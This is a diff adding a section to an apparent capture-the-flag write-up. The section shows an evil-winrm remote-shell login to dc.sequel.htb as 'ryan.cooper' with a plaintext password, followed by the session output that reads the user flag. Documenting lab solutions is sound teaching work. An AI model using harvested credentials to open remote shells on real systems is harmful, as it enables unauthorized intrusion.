@@ -360,6 +360,29 @@ This user also has access via WINRM
 
 ## Winrm access as `ryan.cooper`
 ```python
+evil-winrm -i dc.sequel.htb -u ryan.cooper -p NuclearMosquito3
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> dir
 
+
+    Directory: C:\Users\Ryan.Cooper\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        3/21/2026   5:20 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
+9c5ecf10228361a6eb1c55bad139c2e4
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> 
 ```
 
